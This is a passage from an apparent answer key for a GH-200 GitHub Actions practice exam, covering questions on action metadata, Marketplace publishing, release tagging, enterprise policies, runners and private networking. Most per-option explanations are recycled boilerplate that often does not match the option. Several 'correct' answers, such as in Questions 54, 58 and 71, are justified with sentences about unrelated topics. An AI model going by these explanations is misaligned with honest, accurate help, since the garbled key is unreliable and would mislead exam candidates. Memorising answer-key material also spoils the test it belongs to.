Correct answer: A (is correct). Top-level `branding: { icon: '<feather-icon-name>', color: '<supported-color>' }` (`such as blue, green, purple, orange, red, yellow, gray-dark, white`) customizes the action's Marketplace card icon and color. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 54 — `B, C, E` (Author and maintain actions)

Correct answers: B, C, and E (are correct). `name`, `description`, and `runs` are mandatory top-level keys in every `action.yml` (`or action.yaml`); JavaScript actions bundle `dist/index.js` under `runs.using: 'node20'`; and Docker actions pass container CLI arguments via `runs.args:` or `ENTRYPOINT`. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Correct. Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.
- **C:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 55 — `D` (Author and maintain actions)

Correct answer: D (is correct). Use `core.setSecret(dbPassword)` first to mask the secret in logs, `core.exportVariable('DB_PASSWORD', dbPassword)` (`or core.setOutput` if needed), and `core.saveState('leaseId', leaseId)` in `pre:` paired with `core.getState('leaseId')` in `post:` (`via $GITHUB_STATE`). [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.

### Question 56 — `A` (Author and maintain actions)

Correct answer: A (is correct). GitHub retired stdout `::set-output` and `::save-state` commands to prevent untrusted stdout injection; upgrading `@actions/core` (`>= v1.10.0`) switches `core.setOutput()` and `core.saveState()` to write securely to `$GITHUB_OUTPUT` and `$GITHUB_STATE` files. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 57 — `C` (Author and maintain actions)

Correct answer: C (is correct). Host `kestrelpay/pci-redactor-action` in an `Internal` (or `Private`) repository inside the Enterprise and enable `Settings -> Actions -> General -> Access -> Accessible from repositories in the 'kestrelpay' organization (or enterprise)` so `uses: kestrelpay/pci-redactor-action@<sha>` works directly. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 58 — `D` (Author and maintain actions)

Correct answer: D (is correct). Because local path actions (`uses: ./.github/actions/...`) are read from the runner's `$GITHUB_WORKSPACE` filesystem rather than fetched separately by the runner control plane, the job MUST execute `actions/checkout` BEFORE invoking `uses: ./.github/actions/rust-fmt`. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.

### Question 59 — `B` (Author and maintain actions)

Correct answer: B (is correct). No — GitHub Marketplace requires a `Public` single-action repository containing `action.yml` (`or action.yaml`) at the repository root (`and cannot contain .github/workflows mixed as the action root`); multi-action subfolder monorepos cannot publish directly to Marketplace. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **B:** Correct. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — GitHub Marketplace requires a `Public` single-action repository containing `action.yml` (`or action.yaml`) at the repository root (`and cannot contain .github/workflows mixed as the action root`); multi-action subfolder monorepos cannot publish directly to Marketplace.

### Question 60 — `C` (Author and maintain actions)

Correct answer: C (is correct). Creating a `Public` single-action repo with root `action.yml`, adding unique `name`/`description`/`README`/`branding`, enabling `2FA` & accepting the Marketplace Developer Agreement, and publishing a SemVer GitHub Release (`Publish to Marketplace`) completes listing. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. Private/Internal repos and multi-action monorepos cannot publish directly to GitHub Marketplace, and Releases + `2FA` are required.
- **B:** Incorrect. Marketplace enforces globally unique action `name` metadata and root `action.yml` validation inside the Release UI.
- **C:** Correct. GitHub Marketplace requires a public single-action repo with root `action.yml`, complete branding/docs, `2FA`, and a SemVer GitHub Release.
- **D:** Incorrect. EMU accounts cannot publish public repos on `github.com`, and `description`/`runs` + SemVer version tags are mandatory.

### Question 61 — `B` (Author and maintain actions)

Correct answer: B (is correct). Create immutable annotated tag `v1.4.0`, fast-forward/force-update major tag `v1` (`and minor v1.4`) to the `v1.4.0` commit for convenience consumers, and document the full 40-character commit SHA (`plus Dependabot version updates for github-actions`) for high-assurance pinning. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 62 — `A, C` (Author and maintain actions)

Correct answers: A and C (are correct). Dependabot detects SHA-pinned actions, opens automated pull requests updating the 40-character commit SHA (`and trailing # vX.Y.Z comment`) when new SemVer releases ship, and pairs cleanly with Immutable Actions (`GHCR` OCI packages) to prevent tag hijacking. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Correct. Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 63 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Organization or Enterprise Repository Rulesets (`Require workflows to pass before merging`) enforce a central workflow on matching target repositories before PR merges without requiring local workflow copies (`replacing deprecated organization required workflows`). [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 64 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). An `Internal` repository is readable by members across organizations in the Enterprise without exposing proprietary CI logic publicly on `github.com`, and when its `Actions -> General -> Access` sharing policy allows enterprise access, all orgs can invoke its actions/workflows directly. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 65 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). No — a Ruleset-enforced required workflow runs directly from the central source repository and pinned ref (`v3.1.0`), so repository maintainers cannot alter its YAML steps or bypass its merge status check unless granted an explicit Ruleset bypass actor role. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.

### Question 66 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). By default, `Private` and `Internal` repositories disallow external workflow/action execution; enabling `Settings -> Actions -> General -> Access` (`Accessible from repositories in the organization` or `enterprise`) permits sibling repos to invoke their reusable workflows and actions with `GITHUB_TOKEN`. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 67 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). No — `Access -> Accessible from repositories in the enterprise` allows `Private` and `Internal` repositories across organizations in the same Enterprise to invoke the action/reusable workflow, while `Public` repositories can NEVER invoke actions stored in `Private` or `Internal` repositories. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 68 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Set default `GITHUB_TOKEN` permissions to `Read repository contents and packages permissions` (`contents: read`, `packages: read`) and leave `Allow GitHub Actions to create and approve pull requests` UNCHECKED across the organization. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.

### Question 69 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Because `Require actions to be pinned to a full-length commit SHA` is enabled (`and docker/* is not under actions/*`), referencing mutable tag `@v6.9.0` is blocked at workflow startup until pinned to its 40-character commit SHA. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 70 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Enabling `Require approval for first-time contributors` (`or Require approval for all outside collaborators`, strictest) holds fork PR workflow runs in `Waiting` until a maintainer with write access inspects the PR diff and approves the run (`and GitHub withholds secrets from fork PRs by default`). [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.

### Question 71 — `A, B, D` (Manage GitHub Actions for the enterprise)

Correct answers: A, B, and D (are correct). Enforcing `Allow select actions and reusable workflows` with `Require actions to be pinned to a full-length commit SHA`, setting default `GITHUB_TOKEN` permissions to `Read repository contents and packages`, and requiring maintainer approval on fork pull request workflows harden enterprise execution. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 72 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Registering a self-hosted runner with `./config.sh --ephemeral` (`or generating a single-use runner via the REST API generate-jitconfig endpoint`) deregisters the runner automatically after completing a single job so each job executes on a clean host. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.

### Question 73 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). GitHub-hosted Larger runners (`Linux x64/arm64, Windows, and macOS Larger runners on GitHub Team / Enterprise Cloud`) provide high-CPU/RAM profiles, optional static public IP ranges, Runner Group access controls, and Azure Private Networking (`Linux/Windows`). [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 74 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Creating an org GitHub App + K8s Secret, creating a restricted Runner Group (`disallowing Public repos`), deploying `gha-runner-scale-set-controller` + `gha-runner-scale-set` (`minRunners: 0`), and allowing egress to `github.com`, `*.actions.githubusercontent.com`, and `ghcr.io` completes GA ARC setup. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Legacy webhook ARC is deprecated; GA `gha-runner-scale-set` uses outbound long-polling and ephemeral single-job pods.
- **B:** Incorrect. Personal PATs share a 5,000/hr cap, public repos expose internal clusters to fork PR attacks, and blocking `ghcr.io` breaks Immutable Actions.
- **C:** Correct. GA ARC pairs `gha-runner-scale-set` + GitHub App auth inside a restricted Runner Group with Immutable Actions (`ghcr.io`) egress.
- **D:** Incorrect. Cloning `.runner` identity files triggers session conflicts; ARC mints fresh JIT runner configs per pod.

### Question 75 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). GitHub-hosted Azure Private Networking (`VNet integration`) delegates an Azure subnet to `GitHub.Network/networkSettings`, associates a GitHub Enterprise network configuration + Runner Group, and attaches Linux/Windows Larger runners directly into the private VNet (`macOS Larger runners do NOT support Azure VNet`). [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 76 — `C, F` (Manage GitHub Actions for the enterprise)

Correct answers: C and F (are correct). Configure `https_proxy` / `http_proxy` / `no_proxy` inside the `.env` file in the runner root directory BEFORE starting `./svc.sh` (`so the listener service inherits proxy settings`), and allow outbound TCP 443 to `github.com`, `api.github.com`, `*.actions.githubusercontent.com` (`including pkg.actions.githubusercontent.com`), and `ghcr.io`. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Correct. Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **E:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **F:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 77 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Either enable `Allow GitHub Actions to access this organization` (`automatic dynamic allowlisting for hosted Actions`) OR migrate jobs onto GitHub-hosted Larger runners with static public IP ranges / Azure VNet integration (`or self-hosted runners`) and add their CIDR blocks to the allow list. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 78 — `C` (Manage GitHub Actions for the enterprise)

